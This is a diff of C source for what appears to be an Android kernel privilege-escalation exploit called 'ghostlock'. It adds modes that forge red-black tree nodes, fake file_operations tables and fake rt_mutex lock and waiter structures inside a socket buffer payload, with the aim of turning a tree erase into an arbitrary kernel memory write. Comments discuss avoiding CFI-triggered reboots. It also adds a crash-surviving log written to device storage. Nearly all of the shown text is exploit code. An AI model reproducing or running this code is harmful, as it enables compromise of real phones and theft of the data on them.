@@ -30,28 +30,37 @@ uintptr_t pselect_custom_target;
 uintptr_t pselect_custom_value;
 int pselect_child_node;  /* 1=write page+0x100 (preserves initialized), 0=write zero */
 
-void durable_proof_log(const char *msg) {
-  const char *paths[] = {
+/* Reference-style panic-surviving log: O_SYNC + fsync every line (yijiacloud/aristotle). */
+void live_sync_log(const char *tag, const char *msg) {
+  static const char *paths[] = {
+      "/sdcard/ghostlock/aarif/live_sync.log",
+      "/storage/emulated/0/ghostlock/aarif/live_sync.log",
+      "/sdcard/Download/ghostlock_live_sync.log",
+      "/data/local/tmp/ghostlock_run/live_sync.log",
       "/storage/emulated/0/ghostlock_logs/stage.txt",
       "/sdcard/ghostlock_logs/stage.txt",
       "/data/local/tmp/ghostlock_run/stage.txt",
   };
-  char line[320];
+  char line[512];
   struct timespec ts;
   clock_gettime(CLOCK_MONOTONIC, &ts);
-  int n = snprintf(line, sizeof(line), "PROOF T+%ld.%03ld %s pid=%d\n",
-                   (long)ts.tv_sec, ts.tv_nsec / 1000000L, msg ? msg : "?",
-                   (int)getpid());
+  int n = snprintf(line, sizeof(line), "T+%ld.%03ld %s %s pid=%d\n",
+                   (long)ts.tv_sec, ts.tv_nsec / 1000000L,
+                   tag ? tag : "LOG", msg ? msg : "?", (int)getpid());
   if (n <= 0)
     return;
   for (size_t i = 0; i < sizeof(paths) / sizeof(paths[0]); i++) {
-    int fd = open(paths[i], O_WRONLY | O_CREAT | O_APPEND, 0644);
+    int fd = open(paths[i], O_WRONLY | O_CREAT | O_APPEND | O_SYNC, 0644);
     if (fd < 0)
       continue;
     (void)write(fd, line, (size_t)n);
     (void)fsync(fd);
     close(fd);
   }
+}
+
+void durable_proof_log(const char *msg) {
+  live_sync_log("PROOF", msg);
   pr_info("PROOF %s\n", msg ? msg : "?");
   fflush(stdout);
   fsync(STDOUT_FILENO);
@@ -404,14 +413,27 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
    * empty black rb node so post-erase re-enqueue can walk waiters root when
    * root was set to fake_fops. llseek/read slots stay NULL (safe).
    */
+  /*
+   * ARISTOTLE only-left uses parent_color=fake_fops. rb_erase/change_child then
+   * treats fake_fops as an rb_node parent and may follow +8/+16 as children.
+   * Putting CFI JTs there (llseek/read) softboots; bootid proof sometimes
+   * avoided rebalance. Force empty black leaf shell [0:0x18) for ARISTOTLE.
+   * .write stays at +0x18 (past rb_node) for FMODE_CAN_WRITE after swap.
+   */
   int rb_leaf = env_flag("MODE4_FOPS_RB_LEAF", 0) ||
                 env_flag("MODE4_ION_SAFE", 0) ||
                 env_flag("MODE4_ROOT_SPRAY", 0) ||
-                env_flag("MODE4_CHAIN", 0);
+                env_flag("MODE4_CHAIN", 0) ||
+                env_flag("MODE4_ZION", 0) ||
+                env_flag("MODE4_ARISTOTLE", 0) ||
+                env_flag("MODE4_WRITE_PROOF", 0) ||
+                env_flag("MODE4_FOPS_SLOT", 0) ||
+                env_flag("MODE4_KIMAGE_MISC", 0) ||
+                env_flag("MODE4_P0_MISC", 0);
   if (rb_leaf) {
     put64(p, off + 0x00, 1); /* BLACK, parent NULL */
     put64(p, off + 0x08, 0); /* rb_right / llseek NULL */
-    put64(p, off + 0x10, 0); /* rb_left / read NULL */
+    put64(p, off + 0x10, 0); /* rb_left / read NULL — NO JT here */
   } else {
     put64(p, off + FOPS_OWNER_OFF, 0);
     put64(p, off + FOPS_LLSEEK_OFF,
@@ -730,7 +752,32 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     mode4_two_node = 0;
     w1_node = payload_base + SCRATCH_OFF;
 
-    if (env_flag("MODE4_REF_LEFT", 0) || env_flag("MODE4_REF_LEFT_PI", 0) ||
+    if (env_flag("MODE4_ARISTOTLE", 0) || env_flag("MODE4_WRITE_PROOF", 0)) {
+      uintptr_t tgt = pselect_custom_target ? pselect_custom_target : misc_p0;
+      const char *shape = getenv("WRITE_PROOF_SHAPE");
+      int use_classic = 0;
+      if (shape && (!strcmp(shape, "classic") || !strcmp(shape, "right")))
+        use_classic = 1;
+      else if (shape && (!strcmp(shape, "left") || !strcmp(shape, "onlyleft")))
+        use_classic = 0;
+      else if (tgt == misc_p0)
+        use_classic = 1;
+      if (use_classic) {
+        write_pc = (misc_p0 - 8) & ~3ULL;
+        write_pc |= 1ULL;
+        write_right = fake_fops;
+        write_left = 0;
+        pr_info("mode4 ARISTOTLE W0.pi classic parent=MISC-8|1 right=fake_fops "
+                "left=0\n");
+      } else {
+        write_pc = fake_fops;
+        write_right = 0;
+        write_left = tgt;
+        pr_info("mode4 ARISTOTLE W0.pi only-left parent=fake_fops=%016zx "
+                "right=0 left=%016zx\n",
+                write_pc, write_left);
+      }
+    } else if (env_flag("MODE4_REF_LEFT", 0) || env_flag("MODE4_REF_LEFT_PI", 0) ||
         env_flag("MODE4_TOP_LEFT", 0)) {
       /* oppo-ghostlock-ref default: only-left on W0.pi (main stays 1,0,0) */
       write_pc = fake_fops;
@@ -806,11 +853,28 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, LOCK_OFF + 0x18, 0);
       if (chunk == 0)
         pr_info("mode4 LOCK_EMPTY waiters=0 owner=0 (isolation)\n");
-    } else if (payload_mode == PAGE_PAYLOAD_FOPS && env_flag("MODE4_LOCK_OWNER0", 0)) {
+    } else if (payload_mode == PAGE_PAYLOAD_FOPS &&
+               (env_flag("MODE4_ARISTOTLE", 0) || env_flag("MODE4_WRITE_PROOF", 0))) {
+      /*
+       * aristotle: owner=1 (NULL|HAS_WAITERS) → clean exit after rb_erase,
+       * skip fragile fake_task setprio. waiters root = W0 empty leaf.
+       */
+      put64(p, LOCK_OFF + 0x08, fake_w0);
+      put64(p, LOCK_OFF + 0x10, fake_w0);
+      put64(p, LOCK_OFF + 0x18, 1);
+      if (chunk == 0)
+        pr_info("mode4 ARISTOTLE lock.waiters=W0 owner=1 (clean exit after "
+                "erase; no fake_task boost)\n");
+    } else if (payload_mode == PAGE_PAYLOAD_FOPS &&
+               (env_flag("MODE4_LOCK_OWNER0", 0) || env_flag("MODE4_CHAIN", 0) ||
+                env_flag("MODE4_ZION", 0) || env_flag("MODE4_ION_SAFE", 0) ||
+                env_flag("MODE4_ZERO_NAME", 0) || env_flag("MODE4_ZERO_OWNER", 0) ||
+                env_flag("MODE4_FOPS_SLOT", 0))) {
       /*
        * 5.10 adjust after dequeue: if owner==NULL, skip fake_task setprio path.
        * Keep waiters=W0 so top_waiter stays W0 when stack prio is worse (higher
        * number) than W0 — avoids wake_up_process(waiter->task=init_task).
+       * CHAIN/ION/ZERO auto-enable (phase1-2 still use fake_lock).
        */
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
@@ -886,10 +950,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
      */
     if (env_flag("MODE4_TOP_PI", 0) || env_flag("MODE4_TOP_LEFT", 0))
       put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, 250);
-    else if (env_flag("MODE4_CLASSIC_SAFE", 0) ||
+    else if (env_flag("MODE4_ARISTOTLE", 0) ||
+             env_flag("MODE4_WRITE_PROOF", 0) ||
+             env_flag("MODE4_CLASSIC_SAFE", 0) ||
              env_flag("MODE4_CLASSIC_NOP", 0) ||
              env_flag("MODE4_ZERO_NAME", 0) ||
+             env_flag("MODE4_ZERO_OWNER", 0) ||
              env_flag("MODE4_CHAIN", 0) ||
+             env_flag("MODE4_ION_SAFE", 0) ||
              env_flag("MODE4_LOCK_OWNER0", 0))
       /* Stack prio=200; W0 must stay top after re-enqueue (lower prio number). */
       put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, 100);
